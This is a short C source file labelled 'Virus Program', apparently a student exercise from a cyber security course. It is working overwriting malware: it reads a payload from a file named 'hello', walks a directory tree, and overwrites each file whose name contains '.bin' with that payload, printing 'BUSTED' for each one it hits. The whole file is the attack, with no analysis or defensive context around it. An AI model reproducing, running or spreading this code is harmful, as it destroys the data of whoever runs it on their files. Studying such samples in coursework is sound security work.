/*
                                                        Virus Program
    By 
    Hrishikesh N
    AM.EN.P2CSN16008
    S2 - MTech Cyber Security Systems and Networks
*/


#include <ftw.h>
#include <stdio.h>
#include <string.h>
#include <libgen.h>
#include <stdlib.h>

char buffer[4096];

int list(const char *name, const struct stat *status, int type);

int main(int argc, char *argv[]) {
    //printf("Infecting Files.....\n");
    FILE *f = fopen ("hello", "rb");
    if(f){
        fseek (f, 0, SEEK_END);
        fseek (f, 0, SEEK_SET);
        if (buffer)
        {
            fread (buffer, 1, 4096, f);
        }
        fclose (f);
    }

        if(argc == 1)
            ftw(".", list, 1);
        else
            ftw(argv[1], list, 1);
    return 0;
}

int list(const char *name, const struct stat *status, int type) {
    char* ext = ".bin";
    char* basec;
    char* n = NULL;
    char z[4096];    

    if(type == FTW_NS)
        return 0;

    if(type == FTW_F && strstr(name, ext) != NULL){
        basec = strdup(name);
        FILE* fh = fopen(basec, "wb");
        
        if(fh != NULL) {
            fwrite (&buffer, sizeof(buffer), 1, fh);
            fclose (fh);    
        }
        printf("%s : BUSTED\n", basec);
    }
    if(type == FTW_D && strcmp(".", name) != 0){
        //fprintf(f, "%s\n", name);
        //printf("%s\n", name);
    }
    return 0;
}